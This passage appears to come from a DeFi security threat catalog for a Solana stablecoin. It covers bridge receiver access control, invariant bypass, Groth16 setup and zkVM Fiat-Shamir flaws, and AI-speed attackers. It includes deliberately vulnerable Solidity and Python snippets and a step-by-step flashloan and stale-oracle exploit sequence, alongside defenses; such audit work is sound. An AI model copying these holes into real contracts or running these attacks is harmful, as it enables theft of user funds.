| A48 Unguarded Cross-Chain Receiver Function (Bridge Receiver Access Control) | 크로스체인 브릿지 수신 함수에 호출자 검증(`onlyGateway` 또는 동등한 제어)이 없을 때, 임의 주소가 위조 크로스체인 메시지로 직접 호출해 토큰 언락을 유발하는 패턴을 감사가 놓침. A32(IBC 메시지 콘텐츠 위조)와 달리 릴레이/게이트웨이를 완전히 우회한 직접 호출이며, 수신 함수 가시성(`external`, `public`)과 msg.sender 검증 누락을 동시에 확인하지 않으면 발견 불가 (CrossCurve ReceiverAxelar expressExecute, 2026-02-02, $3M). |

### A48. Unguarded Cross-Chain Receiver Function (Bridge Receiver Access Control)
**Historical**: CrossCurve (formerly EYWA) bridge (2026-02-02, ~$3M) — `ReceiverAxelar.expressExecute()` had no caller/gateway validation; any address could trigger unauthorized token unlocks across multiple chains.
**Mechanism**: A cross-chain bridge system typically consists of: (1) a source-chain lock/burn, (2) a relay/gateway that routes a proof of the source event, and (3) a destination-chain receiver that unlocks/mints. In CrossCurve's implementation, the `expressExecute` function on the `ReceiverAxelar` contract accepted calls from **any address** — not just the authorized Axelar gateway relay. There was no `require(msg.sender == GATEWAY_ADDRESS)` or equivalent guard. An attacker could directly call this function with fabricated message payloads, bypassing the gateway's proof verification entirely. Exploiting across multiple networks: most malicious activity on Arbitrum, converting stolen tokens to WETH via CoW Protocol.
**Why distinct from A32 (SagaEVM Cross-Chain Bridge Message Forgery)**:
- **A32**: Attacker crafts valid-looking IBC payload → IBC precompile *accepts it through the relay path* (content forgery that fools the relay/bridge)
- **A48**: Attacker *never uses the relay path at all* — directly calls the receiver function bypassing gateway entirely (access control missing at receiver). The relay's proof verification is irrelevant because the receiver doesn't check who called it.
**Why distinct from A4 (Access Control)**:
A4 is the general missing-auth category. A48 is the specific cross-chain receiver pattern that has caused repeated losses across bridge protocols. The "receiver function" pattern deserves separate tracking because:
  (a) bridge auditors often verify message content validation without checking receiver-side caller validation
  (b) the function appears "internal-only" in design but is `external`/`public` in implementation
  (c) cross-chain context means the attacker doesn't need any on-chain balance on the source chain
**Code pattern to find**:
```solidity
// VULNERABLE: no caller check — anyone can call directly with fake payload
function expressExecute(
    bytes32 commandId,
    string calldata sourceChain,
    string calldata sourceAddress,
    bytes calldata payload
) external override {
    // missing: require(msg.sender == GATEWAY, "not gateway");
    (address recipient, uint256 amount, address token) = abi.decode(payload, (address, uint256, address));
    PortalV2(portalV2).unlock(token, recipient, amount);  // unauthorized unlock!
}

// SAFE: validate caller before any message processing
modifier onlyGateway() {
    require(msg.sender == gateway, "CrossCurve: not gateway");
    _;
}
function expressExecute(...) external override onlyGateway {
    // process only if called by authorized gateway relay
}
```
**Solana relevance**: Solana Wormhole (if integrated): Wormhole VAA verification is handled by the Wormhole program itself, but any instruction that acts on a "cross-chain message" must still verify the calling CPI context is the authorized bridge program. If a `handle_message(ctx, payload)` instruction exists:
```rust
// CHECK: verify this is called by the authorized bridge program ID, not arbitrary CPI
require_keys_eq!(ctx.accounts.bridge_program.key(), WORMHOLE_PROGRAM_ID, ErrorCode::UnauthorizedBridge);
```
**Microstable relevance**: ✅ **NOT APPLICABLE** — Microstable is Solana-native with no cross-chain bridge receiver. If Wormhole/IBC integration is ever added, enforce: (1) `require_keys_eq!(bridge_program, AUTHORIZED_BRIDGE_ID)` at instruction level, (2) require VAA signature verification before any collateral credit, (3) never allow the "receive" instruction to be called from arbitrary CPI sources.
**Defense**:
1. **`onlyGateway` modifier (or Solana: program-ID constraint)** on all receiver/message-handler functions — verify `msg.sender` (EVM) or calling program ID (Solana)
2. **Receiver function audit checklist item**: for any function that processes incoming cross-chain messages, confirm: caller must be the authorized gateway relay; any other caller reverts immediately
3. **Defense-in-depth**: even with `onlyGateway`, validate message payload against expected schema/version (A32 defense)
4. **Test**: write an explicit test: `assert_reverts: non_gateway_calls_expressExecute()` — must be in CI before any bridge integration deploy
5. **Invariant monitoring**: alert on any unlock/mint triggered without a corresponding source-chain event confirmed by the relay
**Source**: https://www.scworld.com/brief/crosscurve-bridge-loses-3-million-in-smart-contract-exploit | https://thecyberexpress.com/crosscurve-bridge-3m-cyberattack/ | https://quillaudits.medium.com/crosscurve-1-4m-exploit-c2ef752c4e84

### A47. Per-Element Aggregate Invariant Bypass
**Signal**: Bug bounty report "Breaking Immutability: How I Bypassed a Core Security Invariant in a Major DeFi Protocol" (Block Magnates, 2026-02-25 / confirmed 2026-03-06).
**Mechanism**: A protocol guarantees "structural immutability" — once a strategy/vault/position is initialized, its token composition cannot change. The enforcement check is placed **inside a per-element loop**: it validates whether EACH individual token's storage slot is empty, NOT whether the aggregate structure has already been initialized. Attack: call `initializeStrategy()` with a strategy hash that already exists, but pass NEW tokens whose individual slots are empty. Each token passes `require(slot.isEmpty())` because that specific token's slot has never been written — even though the strategy-level invariant (immutability of the whole) has been violated. Attacker injects arbitrary tokens into an "immutable" strategy.
**Why distinct from A10 (Logic Bug)**: A10 covers general incorrect business logic. A47 is the specific pattern where the code is **locally correct** at every per-element check while the **aggregate architectural invariant** is never enforced. Each line of code passes review individually; only the missing structural-level guard is the flaw.
**Why distinct from A43 (Commit/Reveal Threshold Circumvention)**: A43 exploits per-call VALUE thresholds by splitting amounts. A47 exploits per-element STRUCTURAL checks by passing elements that are individually new but collectively violate aggregate immutability.
**Code pattern to find**:
```solidity
// VULNERABLE: per-slot check doesn't enforce aggregate (strategy-level) immutability
function initializeStrategy(bytes calldata data, address[] calldata tokens, uint256[] calldata amounts) external {
    bytes32 hash = keccak256(data);
    for (uint i = 0; i < tokens.length; i++) {
        // Only checks if THIS token slot is empty — not whether strategy already exists!
        require(_balances[msg.sender][hash][tokens[i]].isEmpty(), "slot not empty");
        _balances[msg.sender][hash][tokens[i]].set(amounts[i]);  // attacker adds new token to existing strategy
    }
}

// SAFE: check aggregate existence before any per-element work
function initializeStrategy(bytes calldata data, address[] calldata tokens, uint256[] calldata amounts) external {
    bytes32 hash = keccak256(data);
    require(!_strategyInitialized[msg.sender][hash], "strategy already exists");  // aggregate gate
    _strategyInitialized[msg.sender][hash] = true;  // set atomically at creation
    for (uint i = 0; i < tokens.length; i++) {
        _balances[msg.sender][hash][tokens[i]].set(amounts[i]);
    }
}
```
**Solana/Anchor relevance**: Anchor programs that manage multi-asset vaults or strategy accounts may use per-account constraints (e.g., `require!(account.amount == 0)`) as initialization guards instead of a dedicated `is_initialized` discriminator field on the parent account. A second call with unused collateral accounts bypasses these per-element checks.
**Microstable relevance**: Rebalance and collateral-admission instructions — verify that the vault-level initialization state (`vault.is_initialized` or discriminator check) is validated at the **instruction entry point**, not only inferred from per-asset slot states. If collateral admission is gated per-asset without an aggregate vault guard, a new collateral type could be injected outside the intended governance flow.
**Defense**:
1. Gate ALL structurally immutable entities with an **aggregate existence flag** set atomically at first initialization (separate from per-element state)
2. In Anchor: use `Account<'info, Strategy>` with Anchor's discriminator check + an explicit `is_initialized: bool` field verified in the instruction constraint
3. Invariant test: `test_cannot_inject_token_into_initialized_strategy` — verify second call with any token combination fails after first initialization
4. Audit checklist item: for every "immutable after init" invariant in docs/whitepaper, trace the enforcement to a structural-level check (whole-object existence gate), not a loop-level per-slot check
**Source**: https://blog.blockmagnates.com/breaking-immutability-how-i-bypassed-a-core-security-invariant-in-a-major-defi-protocol-6038be8a4f94

### A49. ZK Groth16 Trusted Setup Ceremony Misconfiguration (gamma=delta Collapse)
**Signal**: FoomCash ($2.26M, 2026-02-26) and Veil Cash (days prior, Base network) — first confirmed live exploits of ZK cryptographic misconfiguration in production DeFi. Both used Groth16 verifiers where gamma2 == delta2 (collapsed to the same elliptic curve point).
**Mechanism**: Groth16 zero-knowledge proofs rely on a trusted setup ceremony that generates cryptographic parameters including `gamma` and `delta`. These values must be distinct — if they are set to the same elliptic curve point (e.g., `gamma2 == delta2`), the algebraic soundness of the verifier collapses. An attacker can then compute a forged `pC` value that satisfies the verification equation for *any* nullifier hash, without possessing a valid witness or having made a deposit. The attack is pure arithmetic: a script iterates nullifier hashes, computes valid-looking proof components for each, and drains the contract repeatedly. No cryptographic breakthrough needed — the setup was wrong from day one.
**Attack specifics (FoomCash)**:
- Protocol: ZK private lottery on Ethereum + Base
- Verifier flaw: `delta2 == gamma2` in deployed Groth16 verifier constants
- Attack: compute `pC` for arbitrary `nullifierHash` (deposit-free). Repeated 22+ times → drain.
- Second attacker (Decurity) rescued Ethereum side ($1.84M) as white-hat. Base-side drained by original attacker ($320K). Net loss: $420K + platform death.
- Source copycat chain: Veil Cash discovered first → FoomCash hit with same technique days later (A45 cluster pattern: "read the post-mortem, scale it up").
**Why distinct from existing vectors**:
- NOT A4 (access control missing): The smart contract code correctly verifies the proof. The flaw is in the *cryptographic parameters*, not the verification call.
- NOT A10 (logic bug): The Solidity code logic is correct. The deployed constants are wrong.
- NOT A25 (parameter griefing): No manipulation of live parameters. Setup was broken before deployment.
- A49 is specifically the **ZK setup/parameter misconfiguration** class: the protocol's entire security guarantee is invalidated at the cryptographic layer, not the application layer. Auditing the code finds nothing wrong; auditing the *setup ceremony outputs* reveals the flaw.
**Code pattern to find**:
```solidity
// VULNERABLE: gamma and delta are set to the same point (copy-paste / default error)
// In deployed verifier contract:
VerifyingKey memory vk;
vk.gamma2 = Pairing.G2Point(
    [0x1234..., 0x5678...],
    [0xabcd..., 0xef01...]
);
vk.delta2 = Pairing.G2Point(  // SAME as gamma2 — fatal
    [0x1234..., 0x5678...],
    [0xabcd..., 0xef01...]
);

// SAFE: gamma and delta must be distinct toxic waste commitments from ceremony
// Verify: vk.gamma2 != vk.delta2 (different points); ceremony outputs match compiled circuit
```
**On-chain detection**:
```bash
# Read deployed verifier contract storage; compare gamma2 and delta2 field values
# They must not be equal (as G2Point coordinates)
cast call $VERIFIER_ADDRESS "verifyingKey()(tuple)" | grep -E "gamma|delta"
# Also: compare deployed bytecode constants against ceremony output transcript
```
**Microstable relevance**: ✅ **NOT APPLICABLE (current)** — Microstable is a Solana-native oracle-collateralized stablecoin with no ZK proof verifier. Groth16 setup misconfiguration cannot affect the current codebase. **FUTURE WATCH**: If ZK privacy/proof components are ever integrated (e.g., ZK oracle attestation, privacy-preserving mint/redeem), mandate:
1. Third-party ceremony verification: independent audit of setup parameters (`gamma2 ≠ delta2`, correct circuit hash, Powers of Tau transcript)
2. Published setup transcript with third-party attestation before deployment
3. On-chain verifier parameter storage that can be read and cross-checked against ceremony output
4. Canary test: write an explicit test that confirms a forged proof (no deposit) is rejected
**Defense**:
1. **Ceremony verification**: Never deploy a ZK verifier without third-party verification of the trusted setup outputs (gamma2 ≠ delta2, correct Powers of Tau, circuit constraint hash matches)
2. **Audit scope extension**: ZK-protocol audits must include verifying key inspection, not just Solidity code review
3. **Setup transcript publication**: Publish ceremony transcripts publicly; require external parties to verify before mainnet deploy
4. **Forged-proof CI test**: Add a test that generates a fake proof (invalid witness) and confirms the verifier rejects it
5. **Post-mortem copycat window**: After a ZK exploit is public, treat all same-setup ZK protocols as HIGH-PRIORITY targets within 72h (copycat attacker pattern confirmed)
**Source**: https://rekt.news/the-unfinished-proof | https://rekt.news/default-settings | https://www.quillaudits.com/blog/hack-analysis/foomcash-exploit-explained | https://blog.zksecurity.xyz/posts/groth16-setup-exploit/

| A49 ZK Groth16 Trusted Setup Ceremony Misconfiguration | ZK verifier의 gamma2==delta2 (동일 타원곡선 점)으로 인한 Groth16 soundness 완전 붕괴. 코드 감사가 Solidity 로직만 검토하고 배포된 verifying key 파라미터를 검증하지 않으면 발견 불가. 예치 없이 임의 nullifier로 유효한 proof 위조 가능 → 무한 인출. 세리머니 아웃풋 제3자 검증 필수. FoomCash $2.26M, Veil Cash (2026-02-26). |

---

### B49. AI-Speed Adversary Latency Assumption Violation
**Signal**: Cecuro AI Security Research (2026-03): Purpose-built offensive AI agents execute end-to-end exploits on **72% of known-vulnerable contracts**. Baseline GPT-5.1 coding agent detects 34% of vulnerabilities; domain-specialized AI security agent detects 92%. Stellar Cyber / HelpNet Security (2026-03-03): "persistence, autonomy, and scale" — attackers have industrialized agent memory, tool access, and inter-agent dependencies exploitation. The "attacker AI agents vs defenders AI agents" regime is now confirmed in production DeFi.
**Mechanism**: Existing DeFi defense stacks (Discord alerts, keeper check-in intervals, on-call human response, manual parameter review) are calibrated for human-operated attacks that require minutes to hours to prepare and execute. Purpose-built offensive AI agents operate at a fundamentally different tempo:
1. **Parallel contract scanning**: probe thousands of contracts simultaneously to identify exploitable state
2. **Condition convergence detection**: continuously monitor for the precise block/slot where multiple vulnerability conditions converge (stale oracle + boundary collateral + keeper gap + flash loan availability)
3. **Sub-second exploit execution**: once conditions detected, full exploit chain (flashloan → manipulate → extract → repay) executes in a single transaction — before any human-speed alert can be acted on
4. **Copycat acceleration**: FoomCash/Veil Cash pattern confirmed — once a ZK setup exploit is published, AI generates adapted exploits for same-tech protocols within hours, not days
**Why distinct from B37–B48** (all AI vectors):
- B37: adversary steganographically evades *within* the defense AI agent
- B38: multi-turn injection into AI agent tool return handling
- B43: memory/log poisoning to steer AI reasoning
- B46: non-adversarial normal operation risk (no attacker)
- B48: browser-localhost gateway takeover
- **B49**: EXTERNAL AI attacker operating at machine speed vs a protocol defended at human-response speed — **temporal asymmetry, not prompt/memory manipulation**. The protocol's code and defenses may be correct; the response time assumption is the vulnerability.
**Microstable relevance**: HIGH — all four architecture chains are affected
- **Oracle ↔ Price ↔ Mint/Redeem**: Pyth staleness window (e.g., 600 slots ~= 5 min). AI detects staleness event AND collateral boundary condition within the same slot → single-TX exploit before keeper next run
- **Keeper ↔ On-chain**: keeper runs every N blocks. AI probes protocol state at each block within the interval, identifies exploitable combinations invisible in steady-state
- **Agent ↔ Governance ↔ Parameter**: AI-assisted governance influence (posting, framing, timing) at machine speed can overwhelm human deliberation window
- **Dashboard ↔ RPC ↔ On-chain**: AI-driven RPC probing (D35 class) at scale can bypass rate limits through distributed origination
**Specific exploit scenario (Microstable)**:
```
Block N:    AI agent probes → oracle price stale (slot_age = 595), collateral near threshold
Block N+1:  Staleness guard triggers (slot_age ≥ 600) — keeper hasn't checked in
Block N+1:  Same block — AI executes: flashloan → overprice collateral via stale feed → 
            mint excess stablecoin → swap → repay flashloan
Block N+1:  Human Discord alert fires ~30 sec later — exploit already landed
```
**Defense**:
1. **On-chain mechanical circuit breakers**: oracle staleness → auto-pause mint/redeem (no human in the loop; the chain enforces it)
2. **Keeper heartbeat as invariant**: if keeper has not submitted an uptime proof within X slots, protocol halts — not an alert, a state machine transition
3. **Sub-block response requirement**: any invariant that requires human response after an alert is a structural vulnerability against AI attackers; design for keeper-or-halt, not keeper-or-notify
4. **Adversarial latency assumption**: all timing parameters (staleness limits, keeper intervals, circuit breaker thresholds) must assume an attacker with sub-second reaction time and perfect state visibility
5. **Copycat response SLA**: when any same-tech protocol exploit is published (ZK, oracle, bridge), trigger 24h mandatory review of same attack class in Microstable — no grace period
**Why auditors miss it**: Security audits model human-paced attackers who require preparation time (hours/days) between discovery and exploitation. AI-speed adversarial conditions require that every time window > 0 blocks with exploitable state be treated as a live vulnerability — a fundamentally different security model than what static/manual code audits apply.
**Source**: https://securityboulevard.com/2026/03/purpose-built-ai-security-agent-detected-92-of-defi-contracts-vulnerabilities/ | https://www.helpnetsecurity.com/2026/03/03/enterprise-ai-agent-security-2026/ | Cecuro AI Security Research (2026-03)

| B49 AI-Speed Adversary Latency Assumption Violation | 감사가 "공격자는 발견 후 수 시간~수 일 내에 실행" 모델을 암묵적으로 전제. AI 에이전트는 수천 계약을 병렬 스캔하고 조건 수렴(staleness + 경계 담보 + keeper 공백)을 블록 단위로 탐지해 단일 TX로 즉시 실행. 인간-응답-루프 의존 방어 설계(alert→human→act)는 AI 속도 공격자에 구조적으로 무효. 온체인 기계적 circuit breaker + keeper heartbeat invariant 필수. (Cecuro 2026-03: AI agent 72% known-vulnerable 계약 실제 익스플로잇 확인) |

---

### A50. zkVM Fiat-Shamir Public-Claim Unbound Variable Bypass
**Signal**: OtterSec "Unfaithful Claims: Breaking 6 zkVMs" (2026-03-03) — six production zkVM systems (Jolt, Nexus, Cairo-M, Ceno, Expander, Binius64) found vulnerable to complete proof forgery via public-claim binding failure in Fiat-Shamir transcripts.
**Mechanism**: Groth16/PLONK/STARK-based zkVMs rely on the Fiat-Shamir heuristic to make interactive proofs non-interactive. In the Fiat-Shamir transcript, the prover absorbs public data (program inputs, claimed outputs, public statement) and *then* squeezes out random challenge values. In the six affected systems, public-claim data (the values the proof claims to assert about the program's inputs/outputs) was **not absorbed into the transcript before challenge generation**. This creates a mathematical gap: the challenge values become independent of the public claims, so the verification equations in later proof steps have the statement values as **free attacker-controlled variables**. An attacker can set any statement they wish (e.g., "I ran program X with input 1 and got output $1,000,000") and compute valid proof components that satisfy the unbound verification equation — without actually executing the program or holding the witness.
**Attack impact (blockchain context)**: If a zkVM verifier has this flaw and guards value flows (e.g., "proof that correct execution produced collateral credit"), an attacker can:
1. Claim a deposit of $1M without depositing anything
2. Forge an oracle attestation with arbitrary price
3. Mint unbacked stablecoins by claiming a valid execution path that never occurred
**Why distinct from A49 (Groth16 gamma=delta)**:
- A49: Setup ceremony used *wrong cryptographic constants* (gamma2 == delta2) — constants are committed, flaw is in the trusted setup output
- A50: Constants are *correct*, but the transcript *ordering* is wrong — public claims are squeezed/evaluated in the wrong sequence before being bound into the Fiat-Shamir hash, making them unbound at challenge time
- A49 is a deployment/ceremony error; A50 is a protocol/implementation error in how the verifier constructs its transcript
**Affected systems (OtterSec 2026-03-03 disclosure)**:
- Jolt: `claimed_sum` unbound in GKR sumcheck challenges
- Nexus: public-input commitment not absorbed before OODS challenges
- Cairo-M: MLE evaluation claim unbound before FRI challenges
- Ceno: LogUp `opening_claim` unbound in lookup challenges
- Expander: GKR claimed values unbound before circuit challenges (Polyhedra launched public bug bounty)
- Binius64: sumcheck claimed values unbound before polynomial commitment challenges
**Code pattern to find**:
```python
# VULNERABLE: public claims absorbed AFTER challenge squeezing
transcript.absorb(proof_commitments)
challenge = transcript.squeeze()          # challenges don't depend on claimed_outputs!
transcript.absorb(claimed_outputs)        # too late — challenge is already fixed
verified = verify_sumcheck(proof, challenge, claimed_outputs)  # claimed_outputs are free variables

# SAFE: absorb ALL public claims BEFORE squeezing challenges
transcript.absorb(proof_commitments)
transcript.absorb(claimed_outputs)        # bind claims first
challenge = transcript.squeeze()          # now challenge cryptographically depends on claims
verified = verify_sumcheck(proof, challenge, claimed_outputs)
```
**On-chain detection**:
```bash
# For Solidity zkVM verifier: check absorb/squeeze ordering in IOP protocol
# Specifically: does squeeze() for any challenge appear BEFORE absorb(claimed_outputs)?
grep -n "squeeze\|absorb\|challenge" Verifier.sol | head -40
# Red flag: "squeeze" before "absorb(public_inputs)" for ANY challenge in the chain
```
**Microstable relevance**: ✅ **NOT APPLICABLE (current)** — Microstable is a Solana-native stablecoin using Pyth oracle feeds. No zkVM component exists in the current architecture. Fiat-Shamir transcript binding is irrelevant to current codebase.
**FUTURE WATCH**: If zkVM components are ever integrated (e.g., ZK oracle attestation, privacy-preserving proof of collateral adequacy, zkCoprocessor for keeper logic), MANDATE:
1. Third-party review of Fiat-Shamir transcript ordering — not just proof verification logic
2. Test with "forged claim" proof (arbitrary output, no witness): must be rejected
3. Verify affected systems (Jolt, Nexus, etc.) are patched before any integration
4. Apply A49 + A50 auditing jointly for any ZK integration: verify setup ceremony AND transcript binding order
**Defense**:
1. **Binding-order audit**: ZK protocol audits must verify that ALL public claims (inputs, outputs, statement) are absorbed into the Fiat-Shamir transcript BEFORE the challenge that depends on them is squeezed
2. **Forged-claim CI test**: for any zkVM-based system, add a test that submits a proof with false public claims (no valid witness) and confirms rejection
3. **Protocol-level fix over library fix**: transcript binding order is a protocol property, not just a code bug; fix must be verified at the protocol spec level, not just patched in one file
4. **Post-disclosure 72h review window**: OtterSec's disclosure confirmed the A45 copycat pattern applies to zkVM vulnerabilities; when a zkVM binding flaw is published for one system, all same-family systems should be treated as HIGH priority within 72h
**Source**: https://osec.io/blog/2026-03-03-zkvms-unfaithful-claims/ | https://blog.polyhedra.network/expander-bug-bounty/ | https://rekt.news/default-settings

| A50 zkVM Fiat-Shamir Public-Claim Unbound Variable Bypass | Jolt/Nexus/Cairo-M/Ceno/Expander/Binius64 등 6개 zkVM에서 public-claim 데이터(입출력)가 Fiat-Shamir transcript에 challenge 생성 전 바인딩되지 않음. 결과: 검증 방정식 후반부에서 statement 값이 공격자 제어 변수로 변환 → 임의 허위 명제 증명 가능 → 블록체인 컨텍스트에서 유효 예치 없이 출금/민팅. A49(gamma=delta 셋업 상수 오류)와 구별: A50은 상수 정상, transcript 흡수 순서 오류. 현재 Microstable 미해당(ZK 미사용). zkVM 통합 시 transcript 바인딩 순서 외부 감사 필수. (OtterSec 2026-03-03) |
